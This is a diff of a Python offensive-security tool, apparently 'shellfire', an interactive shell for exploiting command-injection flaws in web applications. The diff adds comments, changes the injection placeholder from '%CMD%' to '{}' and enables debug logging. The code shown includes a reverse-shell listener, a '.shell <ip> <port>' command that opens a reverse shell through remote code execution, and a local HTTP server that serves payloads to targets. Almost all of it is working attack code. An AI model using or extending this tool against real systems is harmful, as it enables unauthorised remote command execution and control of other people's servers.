@@ -145,8 +145,8 @@ def show_help(cmd=None):
   elif cmd == "shell":
     sys.stdout.write(".shell <ip_address> <port> - initiate reverse shell to target\n")
   elif cmd == "url":
-    sys.stdout.write(".url <string> - set the target URL to string. Use '%CMD%' to specify where command injection goes.\n")
-    sys.stdout.write("                if %CMD% is not set, 'cmd' param will automatically be appended.\n")
+    sys.stdout.write(".url <string> - set the target URL to string. Use '{}' to specify where command injection goes.\n")
+    sys.stdout.write("                if {} is not set, 'cmd' param will automatically be appended.\n")
   elif cmd == "useragent":
     sys.stdout.write(".useragent - show the User-Agent string\n")
     sys.stdout.write(".useragent <string> - set the value for User-Agent\n")
@@ -173,14 +173,16 @@ Available commands:
 """)
 
 def http_server(port):
+  ## super simple http. we can probably make this more robust.
+  ## set up network listener first
   addr = ''
   conn = None
-
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   sock.settimeout(1)
   sock.bind((addr, port))
   sock.listen(1)
+  ## server loop
   while cfg.http_running == True:
     try:
       if not conn:
@@ -189,15 +191,18 @@ def http_server(port):
 
       http_response = "HTTP/1.1 200 OK\n\n" + cfg.payload + "\n"
 
+      ## send payload to the client
       conn.send(bytes(http_response, 'utf-8'))
       conn.close()
       conn = None
     except Exception as e:
-      #sys.stderr.write("[!] Err. socket.error : %s\n" % e)
+      if args.debug:
+        sys.stderr.write("[!] Err. socket.error : %s\n" % e)
       pass
   sys.stdout.write("[*] HTTP Server stopped\n")
 
 def rev_shell(addr, port):
+  ## setup listener for reverse shell
   port = int(port)
   cfg.revshell_running = True
   conn = None
@@ -207,10 +212,12 @@ def rev_shell(addr, port):
   sock.listen(1)
   conn, client_address = sock.accept()
 
+  ## listener loop
   while True:
     socket_list = [conn, sys.stdin]
     read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
 
+    ## wait for connections
     for s in read_sockets:
       if s == conn:
         data = s.recv(4096)
@@ -224,11 +231,13 @@ def rev_shell(addr, port):
         msg = input()
         conn.send(msg)
 
+  ## cleanup
   conn.close()
   cfg.revshell_running = False
   return
 
 def cmd_auth(cmd):
+  ## configure HTTP Basic auth settings
   if len(cmd) > 1:
     cfg.auth_user, cfg.auth_pass = cmd[2][len(cmd[0])+1:].split(":",1)
     cfg.auth = requests.auth.HTTPBasicAuth(cfg.auth_user, cfg.auth_pass)
@@ -237,6 +246,7 @@ def cmd_auth(cmd):
   return
 
 def cmd_cookies(cmd):
+  ## configure cookies to be sent to target
   if len(cmd) < 2:
     sys.stdout.write("[*] cookies: %s\n" % (cfg.cookies))
   else:
@@ -248,11 +258,12 @@ def cmd_cookies(cmd):
   return
 
 def cmd_encode(cmd):
+  ## if no params passed, display current encoding plugins
   if len(cmd) == 1:
-    #sys.stdout.write("[*] encoding: %s\n" % (cfg.encode))
     sys.stdout.write("[*] encoding: %s\n" % (' | '.join(cfg.encode_chain)))
     return False
-  ##  let's remove ".encode" from our cmd
+  ## Set our encoding plugins!
+  ## let's remove ".encode" from our cmd
   cmd.pop(0)
   ## reset our chain
   cfg.encode_chain = []
@@ -271,6 +282,7 @@ def cmd_encode(cmd):
   return False
 
 def cmd_find(cmd):
+  ## run "find" on remote target
   if len(cmd) != 2:
     sys.stdout.write("[!] Invalid parameters\n")
     return False
@@ -291,6 +303,7 @@ def cmd_help(cmd):
   return
 
 def cmd_history(cmd):
+  ## configure history settings for shellfire (via readline)
   if len(cmd) == 1:
     if os.path.isfile(cfg.history_file):
       sys.stdout.write("[*] History writing is enabled\n")
@@ -310,6 +323,7 @@ def cmd_history(cmd):
   return
 
 def cmd_http(cmd):
+  ## control our local http server
   if len(cmd) == 1:
     if cfg.http_running == True:
       sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
@@ -349,6 +363,8 @@ def cmd_http(cmd):
   return
 
 def cmd_marker(cmd):
+  ## set the marker for our rce payloads
+  ## this will determine boundaries to split and clean output
   if len(cmd) != 2:
     sys.stderr.write("[!] Invalid parameters\n")
     return
@@ -357,6 +373,7 @@ def cmd_marker(cmd):
   return
 
 def cmd_method(cmd):
+  ## configure HTTP method to use against the target
   if len(cmd) > 2:
     sys.stderr.write("[!] Invalid parameters\n")
     sys.stderr.write("    .method <method>\n")
@@ -370,10 +387,12 @@ def cmd_method(cmd):
   return
 
 def cmd_phpinfo(cmd):
+  ## trigger phpinfo payload
   userinput = "_show_phpinfo"
   return True
 
 def cmd_post(cmd):
+  ## configure POST data to send
   if len(cmd) < 2:
     cfg.post = {}
   else:
@@ -383,6 +402,7 @@ def cmd_post(cmd):
   return
 
 def cmd_referer(cmd):
+  ## set HTTP referer
   if len(cmd) > 1:
     cmd.pop(0)
     cfg.headers['Referer'] = " ".join(cmd)
@@ -390,6 +410,7 @@ def cmd_referer(cmd):
   return
 
 def cmd_shell(cmd):
+  ## initiate a reverse shell via rce
   if len(cmd) != 3:
     sys.stderr.write("[!] Invalid parameters\n")
     sys.stderr.write("    .shell <ip_address> <port>\n")
@@ -409,12 +430,14 @@ def cmd_shell(cmd):
   return True
 
 def cmd_url(cmd):
+  ## set URL for remote target
   if len(cmd) > 1:
     cfg.url = userinput[len(cmd[0])+1:]
   sys.stdout.write("[*] Exploit URL set: %s\n" % cfg.url)
   return
 
 def cmd_useragent(cmd):
+  ## set the user agenet to send to target
   if len(cmd) > 1:
     cfg.headers['User-Agent'] = userinput[len(cmd[0])+1:]
   sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
@@ -519,12 +542,8 @@ while True:
   if exec_cmd:
     cmd = userinput
 
-    ## if there are no encoding plugins, let's just escape our backslashes
-    if not len(cfg.encode_chain):
-      #cmd = cmd.replace("\\", "\\\\")
-      pass
-    else:
-      ## let's run our input through our encoding plugins
+    ## let's run our input through our encoding plugins
+    if len(cfg.encode_chain):
       try:
         for enc in cfg.encode_chain:
           cmd = plugins.plugins[enc].run(cmd)
@@ -532,8 +551,8 @@ while True:
         pass
 
     ## validate the URL format
-    if '%CMD%' in cfg.url:
-      query = cfg.url.replace('%CMD%', cmd.strip())
+    if '{}' in cfg.url:
+      query = cfg.url.replace('{}', cmd.strip())
     else:
       if '?' in cfg.url:
         if 'cmd=' not in cfg.url:
